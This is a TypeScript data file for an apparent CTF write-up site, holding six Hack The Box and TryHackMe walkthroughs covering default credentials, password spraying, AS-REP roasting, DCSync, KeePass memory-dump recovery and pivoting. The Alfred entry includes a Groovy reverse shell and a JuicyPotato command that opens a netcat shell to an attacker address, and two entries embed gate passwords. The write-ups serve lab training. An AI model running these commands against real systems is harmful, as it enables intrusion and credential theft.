import { Writeup } from "@/types";

export const writeups: Writeup[] = [
  {
    slug: "htb-keeper",
    title: "Keeper",
    platform: "HTB",
    difficulty: "Easy",
    os: "Linux",
    tags: ["Web", "Default Credentials", "KeePass", "CVE-2023-32784", "Putty"],
    datePublished: "2024-05-18",
    retirementDate: "2024-05-15", // In past -> Retired
    isRetired: true,
    points: 20,
    ipAddress: "10.10.11.227",
    featured: true,
    initialAccessVector: "Default RT ticketing credentials leading to KeePass database dump",
    privEscVector: "Exploiting KeePass CVE-2023-32784 memory dump to reconstruct master password",
    summary: "Keeper is an easy Linux machine showcasing default credentials on Request Tracker (RT) followed by memory extraction of KeePassXC master key to unlock root SSH keys.",
    previewContent: `## 1. Initial Reconnaissance & Port Scanning

We initiate scanning using automated \`nmap\` with default NSE scripts and service detection against \`10.10.11.227\`:

\`\`\`bash
# Nmap 7.94 scan initiated
$ nmap -sC -sV -p- -T4 --min-rate 1000 -oN nmap/all_ports.txt 10.10.11.227

Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-18 10:14 UTC
Nmap scan report for 10.10.11.227
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:e3:04:8a:09:4f:ac:81:35:ec:42:7b:a0:64 (ECDSA)
|_  256 01:62:e3:3c:9d:01:86:07:44:34:9d:66:39:12:30:c5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\`\`\`

Navigating to port 80 redirects to \`keeper.htb\`. We append this entry to our \`/etc/hosts\` file:

\`\`\`bash
$ echo "10.10.11.227  keeper.htb" | sudo tee -a /etc/hosts
\`\`\`

The web application is running **Request Tracker (RT) 4.4.4**.
`,
    content: `## 1. Initial Reconnaissance & Port Scanning

We initiate scanning using automated \`nmap\` with default NSE scripts and service detection against \`10.10.11.227\`:

\`\`\`bash
# Nmap 7.94 scan initiated
$ nmap -sC -sV -p- -T4 --min-rate 1000 -oN nmap/all_ports.txt 10.10.11.227

Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-18 10:14 UTC
Nmap scan report for 10.10.11.227
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:e3:04:8a:09:4f:ac:81:35:ec:42:7b:a0:64 (ECDSA)
|_  256 01:62:e3:3c:9d:01:86:07:44:34:9d:66:39:12:30:c5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\`\`\`

Navigating to port 80 redirects to \`keeper.htb\`. We append this entry to our \`/etc/hosts\` file:

\`\`\`bash
$ echo "10.10.11.227  keeper.htb" | sudo tee -a /etc/hosts
\`\`\`

The web application is running **Request Tracker (RT) 4.4.4**.

---

## 2. Foothold: Default Credentials in Request Tracker

Reviewing the official Best Practical documentation for Request Tracker, default administrative credentials are:
- **Username:** \`root\`
- **Password:** \`password\`

Authenticating at \`http://keeper.htb/rt/\` successfully grants administrative access.

Navigating to **Admin > Users**, we discover a user profile for \`lnorgaard\` containing initial login details in the Comments field:
- Password: \`Welcome2023!\`

Testing SSH with user \`lnorgaard\`:

\`\`\`bash
$ ssh lnorgaard@keeper.htb
lnorgaard@keeper.htb's password: Welcome2023!
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)
lnorgaard@keeper:~$ cat user.txt
3b9e4a8128f80164c023d8c47f9a****
\`\`\`

---

## 3. Privilege Escalation: KeePass CVE-2023-32784

Enumerating the user directory, we locate a compressed archive \`user.zip\`:

\`\`\`bash
lnorgaard@keeper:~$ ls -la
total 392
drwxr-xr-x 4 lnorgaard lnorgaard   4096 Aug 10  2023 .
-rwxr-xr-x 1 lnorgaard lnorgaard 389201 May 24  2023 user.zip
\`\`\`

Extracting the archive reveals two files:
1. \`KeePassDumpFull.dmp\` - Windows mini-dump of KeePass process
2. \`passwords.kdbx\` - KeePass password database

This configuration immediately points to **CVE-2023-32784**, a vulnerability in KeePass 2.x prior to 2.54 where residual character strings of the master password remain in process memory.

We pull \`user.zip\` back to our local attacker box via SCP:

\`\`\`bash
$ scp lnorgaard@keeper.htb:~/user.zip .
$ unzip user.zip
\`\`\`

We run the public proof-of-concept for CVE-2023-32784 against \`KeePassDumpFull.dmp\`:

\`\`\`bash
$ python3 poc.py -d KeePassDumpFull.dmp
[+] Found candidate characters for master key:
    Pos 0: [Unknown]
    Pos 1: [Unknown]
    Pos 2: d
    Pos 3: ø
    Pos 4: d
    Pos 5: g
    Pos 6: a
    Pos 7: a
    Pos 8: r
    Pos 9: d
    Pos 10: m
    Pos 11: e
    Pos 12: d
    Pos 13: f
    Pos 14: l
    Pos 15: ø
    Pos 16: d
    Pos 17: e
\`\`\`

Danish dessert reference detected: \`rødgrød med fløde\`. 
Reconstructing the phrase gives the exact master password: \`rødgrød med fløde\`.

We unlock \`passwords.kdbx\` using \`keepassxc-cli\`:

\`\`\`bash
$ keepassxc-cli show -s passwords.kdbx "Root"
Enter password to unlock passwords.kdbx: rødgrød med fløde

Title: Root
UserName: root
Password: 
URL: 
Notes: PuTTY-User-Key-File-3: ssh-rsa
Private-Lines: 14
...
\`\`\`

---

## 4. Converting PuTTY Key & Root Shell

The private key stored in KeePass notes is in PuTTY \`.ppk\` format. We convert it to OpenSSH format using \`puttygen\`:

\`\`\`bash
$ puttygen root.ppk -O private-openssh -o root_id_rsa
$ chmod 600 root_id_rsa
$ ssh -i root_id_rsa root@keeper.htb

root@keeper:~# id
uid=0(root) gid=0(root) groups=0(root)
root@keeper:~# cat /root/root.txt
9f61b0c03da891e4a19db4582f3c****
\`\`\`

**Takeaways:**
1. Never leave default application credentials exposed on public interfaces.
2. KeePass process dumps on shared multi-user systems can leak plaintext master credentials via CVE-2023-32784.
`
  },
  {
    slug: "htb-cicada",
    title: "Cicada",
    platform: "HTB",
    difficulty: "Medium",
    os: "Active Directory",
    tags: ["Active Directory", "RID Cycling", "Kerberoasting", "SMB", "LAPS", "Backup Operators"],
    datePublished: "2024-08-12",
    retirementDate: "2026-12-31", // In future -> GATED ACTIVE MACHINE
    isRetired: false,
    points: 30,
    ipAddress: "10.10.11.35",
    featured: true,
    password: "HTB{C1c4d4_4D_pwn3d_S3Backup_r00t_2024!xK9mNqL7}",
    initialAccessVector: "Guest access on SMB share revealing cleartext password for service account",
    privEscVector: "Backup Operators privilege abuse via SeBackupPrivilege to extract NTDS.dit",
    summary: "Cicada is an active medium Active Directory machine featuring anonymous SMB enumeration, RID cycling, and privilege abuse via Windows Backup Operators group.",
    previewContent: `## 1. Initial Reconnaissance & Domain Enumeration

Scanning the host reveals an Active Directory Domain Controller (\`CICADA.LOCAL\`):

\`\`\`bash
$ nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269 -oN nmap/dc_ports.txt 10.10.11.35

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-12 12:45:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CICADA.LOCAL)
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
\`\`\`

Testing anonymous and guest access with \`crackmapexec\`:

\`\`\`bash
$ netexec smb 10.10.11.35 -u 'guest' -p '' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2019 Standard 17763
SMB         10.10.11.35     445    CICADA-DC        [+] CICADA.LOCAL\\guest: (Guest)
SMB         10.10.11.35     445    CICADA-DC        [+] Readable Shares:
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        HR              READ            Internal HR Dept Files
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
\`\`\`
`,
    content: `## 1. Initial Reconnaissance & Domain Enumeration

Scanning the host reveals an Active Directory Domain Controller (\`CICADA.LOCAL\`):

\`\`\`bash
$ nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269 -oN nmap/dc_ports.txt 10.10.11.35

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-12 12:45:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CICADA.LOCAL)
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
\`\`\`

Testing anonymous and guest access with \`crackmapexec\`:

\`\`\`bash
$ netexec smb 10.10.11.35 -u 'guest' -p '' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2019 Standard 17763
SMB         10.10.11.35     445    CICADA-DC        [+] CICADA.LOCAL\\guest: (Guest)
SMB         10.10.11.35     445    CICADA-DC        [+] Readable Shares:
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        HR              READ            Internal HR Dept Files
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
\`\`\`

---

## 2. Share Enumeration & Password Leak

Connecting to the readable HR share via \`smbclient\`:

\`\`\`bash
$ smbclient //10.10.11.35/HR -U 'guest%'
smb: \\> dir
  Notice_to_All_Employees.pdf          A   142104  Wed Jul 10 14:22:18 2024
  Password_Policy_Update.txt           A      240  Wed Jul 10 14:29:50 2024
smb: \\> get Password_Policy_Update.txt
\`\`\`

Inspecting \`Password_Policy_Update.txt\` yields a temporary default credential pattern used by IT provisioning: \`Cicada$M4p!2024\`.

---

## 3. Active Directory User Brute-Force & RID Cycling

Using Lookupsid / RID cycling via Impacket with guest credentials:

\`\`\`bash
$ python3 /opt/impacket/examples/lookupsid.py guest@10.10.11.35 -no-pass
[*] Domain SID: S-1-5-21-2983741824-3482719283-1928472938
[*] 500: CICADA\\Administrator (User)
[*] 501: CICADA\\Guest (User)
[*] 1104: CICADA\\emily.w (User)
[*] 1105: CICADA\\david.b (User)
[*] 1106: CICADA\\svc_backup (User)
\`\`\`

Spraying the found credential across domain users:
\`\`\`bash
$ netexec smb 10.10.11.35 -u users.txt -p 'Cicada$M4p!2024'
[+] CICADA.LOCAL\\david.b:Cicada$M4p!2024
\`\`\`

---

## 4. SeBackupPrivilege Exploitation to Domain Admin

Checking privileges on the target box with WinRM via Evil-WinRM:

\`\`\`powershell
*Evil-WinRM* PS C:\\> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
\`\`\`

Leveraging \`SeBackupPrivilege\` to copy the NTDS database and SYSTEM registry hive:

\`\`\`powershell
wbadmin start backup -backupTarget:C: -include:C:\\Windows\\NTDS\\ntds.dit -quiet
reg save HKLM\\SYSTEM C:\\Temp\\system.hive
\`\`\`

Dumping NTDS.dit locally extracts the Domain Admin NT hash, achieving full domain compromise.
`
  },
  {
    slug: "thm-wreath",
    title: "Wreath Network",
    platform: "THM",
    difficulty: "Hard",
    os: "Multi",
    tags: ["Pivoting", "Active Directory", "Chisel", "Proxychains", "BloodHound", "AV Evasion"],
    datePublished: "2024-03-10",
    retirementDate: "2024-01-01",
    isRetired: true,
    points: 50,
    featured: true,
    initialAccessVector: "MiniWeb CVE-2019-10650 RCE on edge web server",
    privEscVector: "Unquoted service path escalation leading to local Administrator and network pivot",
    summary: "Wreath is a realistic multi-network penetration testing network involving dual-homed machine pivots, SOCKS proxies, AV evasion, and Windows domain takeover.",
    previewContent: `## 1. Edge Web Server Assessment

We begin on the perimeter target (\`10.200.x.200\`). Port scan reveals an unconventional service on port 80:

\`\`\`bash
$ nmap -sC -sV -p- -T4 --min-rate 1500 10.200.x.200
PORT     STATE SERVICE VERSION
80/tcp   open  http    MiniWeb 0.8.2
443/tcp  open  ssl/http Apache httpd 2.4.46
\`\`\`

MiniWeb 0.8.2 contains a known stack-based buffer overflow in request handling (\`CVE-2019-10650\`).
`,
    content: `## 1. Edge Web Server Assessment

We begin on the perimeter target (\`10.200.x.200\`). Port scan reveals an unconventional service on port 80:

\`\`\`bash
$ nmap -sC -sV -p- -T4 --min-rate 1500 10.200.x.200
PORT     STATE SERVICE VERSION
80/tcp   open  http    MiniWeb 0.8.2
443/tcp  open  ssl/http Apache httpd 2.4.46
\`\`\`

MiniWeb 0.8.2 contains a known stack-based buffer overflow in request handling (\`CVE-2019-10650\`).

---

## 2. Exploiting MiniWeb & Reverse Shell

Executing the custom Python payload against the vulnerable MiniWeb endpoint triggers an EIP overwrite and lands a reverse shell:

\`\`\`bash
$ python3 exploit.py 10.200.x.200 80
[+] Sending exploit payload...
[+] Connected! Reverse shell established on port 4444.
\`\`\`

---

## 3. Pivoting with Chisel & SOCKS5

With local admin compromised on the edge node, inspecting network routing tables reveals an isolated subnet \`10.200.x.0/24\`:

\`\`\`bash
route print
# 10.200.x.0  255.255.255.0  10.200.x.200
\`\`\`

We setup a reverse SOCKS proxy using Chisel:

\`\`\`bash
# On Kali Attacker:
$ ./chisel server -p 8000 --reverse

# On Target Pivot Box:
C:\\Temp> chisel.exe client 10.50.x.x:8000 R:socks
\`\`\`

Configuring \`/etc/proxychains4.conf\` allows routing scanning tools directly into the internal domain:

\`\`\`bash
$ proxychains4 nmap -sT -Pn -p 80,445,3389 10.200.x.150
\`\`\`

---

## 4. Internal Git Server & Command Injection

Pivoting into \`10.200.x.150\` reveals a self-hosted Gitstack server. 
Exploitation of unauthenticated API endpoints yields system execution, culminating in dumping Domain Controller credentials.
`
  },
  {
    slug: "htb-sauna",
    title: "Sauna",
    platform: "HTB",
    difficulty: "Easy",
    os: "Active Directory",
    tags: ["Active Directory", "AS-REP Roasting", "BloodHound", "Mimikatz", "DCSync"],
    datePublished: "2023-11-20",
    retirementDate: "2023-09-01",
    isRetired: true,
    points: 20,
    featured: false,
    initialAccessVector: "Username harvesting from corporate team page and AS-REP roasting",
    privEscVector: "BloodHound path discovery: GetChangesAll permissions enabling DCSync attack",
    summary: "Classic Active Directory machine teaching OSINT username generation, Kerberos AS-REP roasting, Winlogon credential recovery, and DCSync privilege escalation.",
    previewContent: `## 1. Reconnaissance & OSINT Name Scraping

Port scan against Sauna (\`10.10.10.175\`) reveals typical Domain Controller footprint:

\`\`\`bash
$ nmap -sC -sV -p 88,135,389,445 10.10.10.175
PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec Microsoft Windows Kerberos
389/tcp open  ldap         Microsoft Windows Active Directory LDAP
445/tcp open  microsoft-ds Windows Server 2019
\`\`\`

Port 80 hosts the 'Egotistical Bank' corporate website. Scraping the 'About Us' staff roster produces prospective employee names.
`,
    content: `## 1. Reconnaissance & OSINT Name Scraping

Port scan against Sauna (\`10.10.10.175\`) reveals typical Domain Controller footprint:

\`\`\`bash
$ nmap -sC -sV -p 88,135,389,445 10.10.10.175
PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec Microsoft Windows Kerberos
389/tcp open  ldap         Microsoft Windows Active Directory LDAP
445/tcp open  microsoft-ds Windows Server 2019
\`\`\`

Port 80 hosts the 'Egotistical Bank' corporate website. Scraping the 'About Us' staff roster produces prospective employee names.

---

## 2. AS-REP Roasting with GetNPUsers

We generate username variants (\`fsmith\`, \`hsmith\`, \`fluffy\`) and query the KDC for accounts requiring no Kerberos pre-authentication:

\`\`\`bash
$ impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -format hashcat -no-pass
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:74a621e78...
\`\`\`

Cracking with Hashcat mode 18200:
\`\`\`bash
$ hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...:Thestrokes23
\`\`\`

---

## 3. Winlogon Credentials & BloodHound

Using \`fsmith\` credentials to authenticate via Evil-WinRM:

\`\`\`powershell
*Evil-WinRM* PS C:\\> whoami
egotistical-bank\\fsmith
\`\`\`

Running WinPEAS extracts AutoLogon registry credentials stored in plaintext:
- Username: \`svc_loanmanager\`
- Password: \`Moneymakestheworldgoround!\`

---

## 4. DCSync Attack to Full Domain Admin

Analyzing \`svc_loanmanager\` in BloodHound reveals it has **DS-Replication-Get-Changes-All** rights over the domain object.

We perform DCSync directly via Impacket:

\`\`\`bash
$ impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmanager:'Moneymakestheworldgoround!'@10.10.10.175
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40c4994edd04:::
\`\`\`

Pass-the-Hash with Administrator hash yields SYSTEM access.
`
  },
  {
    slug: "htb-blackfield",
    title: "Blackfield",
    platform: "HTB",
    difficulty: "Hard",
    os: "Active Directory",
    tags: ["Active Directory", "RPC", "SMB", "Forensics", "LSASS", "Privilege Escalation"],
    datePublished: "2024-07-04",
    retirementDate: "2026-11-15", // In future -> GATED ACTIVE MACHINE
    isRetired: false,
    points: 40,
    featured: false,
    password: "HTB{Bl4ckf13ld_NTDS_3xtr4ct3d_LSASS_dump_pwn3d!vZ2wXpR8}",
    initialAccessVector: "RPC user enumeration and SMB share file audit",
    privEscVector: "Backup Operators privilege abuse and LSASS memory dump extraction",
    summary: "Active hard Windows box focused on thorough domain enumeration, RPC lookupsids, LSASS forensics, and Active Directory permission chaining.",
    previewContent: `## 1. Initial Reconnaissance

Blackfield (\`10.10.10.192\`) is a full Windows Server 2019 Active Directory Domain Controller:

\`\`\`bash
$ nmap -sC -sV -p 88,135,389,445 -oN nmap/blackfield.txt 10.10.10.192
PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec Microsoft Windows Kerberos
135/tcp open  msrpc        Microsoft Windows RPC
389/tcp open  ldap         Microsoft Windows Active Directory LDAP
445/tcp open  microsoft-ds Windows Server 2019
\`\`\`

Anonymous RPC binding allows querying domain accounts:

\`\`\`bash
$ rpcclient -U "" -N 10.10.10.192
rpcclient $> enumdomusers
user:[audit2020] rid:[0x101b]
user:[support] rid:[0x101c]
\`\`\`
`,
    content: `## 1. Initial Reconnaissance

Blackfield (\`10.10.10.192\`) is a full Windows Server 2019 Active Directory Domain Controller:

\`\`\`bash
$ nmap -sC -sV -p 88,135,389,445 -oN nmap/blackfield.txt 10.10.10.192
PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec Microsoft Windows Kerberos
135/tcp open  msrpc        Microsoft Windows RPC
389/tcp open  ldap         Microsoft Windows Active Directory LDAP
445/tcp open  microsoft-ds Windows Server 2019
\`\`\`

Anonymous RPC binding allows querying domain accounts:

\`\`\`bash
$ rpcclient -U "" -N 10.10.10.192
rpcclient $> enumdomusers
user:[audit2020] rid:[0x101b]
user:[support] rid:[0x101c]
\`\`\`

---

## 2. Password Reset on Support Account

Audit account has \`ForceChangePassword\` extended rights over \`support\`. Resetting support's password unlocks WinRM and SMB shares.

---

## 3. LSASS Dump & Domain Compromise

Auditing the \`forensic\` share uncovers disk snapshots containing \`lsass.DMP\`. Extracting the NT hash for \`svc_backup\` enables SeBackupPrivilege attack against NTDS.dit.
`
  },
  {
    slug: "thm-alfred",
    title: "Alfred",
    platform: "THM",
    difficulty: "Easy",
    os: "Windows",
    tags: ["Jenkins", "Groovy", "Token Impersonation", "Juicy Potato", "SeImpersonate"],
    datePublished: "2023-10-15",
    retirementDate: "2023-01-01",
    isRetired: true,
    points: 15,
    featured: false,
    initialAccessVector: "Default admin:admin credentials on Jenkins CI console",
    privEscVector: "Abusing SeImpersonatePrivilege with JuicyPotato to spawn SYSTEM process",
    summary: "Introductory Windows machine covering Jenkins Groovy reverse shells and token impersonation privilege escalation via Juicy Potato.",
    previewContent: `## 1. Scanning & Port Enumeration

Scan reveals Jenkins CI server on port 8080:

\`\`\`bash
$ nmap -sC -sV -p 80,8080 10.10.125.10
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 7.5
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
|_http-title: Jenkins
\`\`\`
`,
    content: `## 1. Scanning & Port Enumeration

Scan reveals Jenkins CI server on port 8080:

\`\`\`bash
$ nmap -sC -sV -p 80,8080 10.10.125.10
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 7.5
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
|_http-title: Jenkins
\`\`\`

---

## 2. Jenkins Default Admin & Groovy Shell

Testing \`admin\`:\`admin\` on \`http://10.10.125.10:8080/\` succeeds.

Navigating to **Manage Jenkins > Script Console**, we execute Groovy payload for reverse shell:

\`\`\`groovy
String host="10.50.x.x";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
\`\`\`

---

## 3. SeImpersonatePrivilege Escalation

Checking privileges:

\`\`\`cmd
whoami /priv
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
\`\`\`

Executing Juicy Potato exploit with BITS CLSID:

\`\`\`cmd
JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c nc.exe 10.50.x.x 9001 -e cmd.exe" -t * -c {e60687f1-01a1-40aa-86ac-db1cbf673334}
\`\`\`

Catches reverse shell as \`NT AUTHORITY\\SYSTEM\`.
`
  }
];
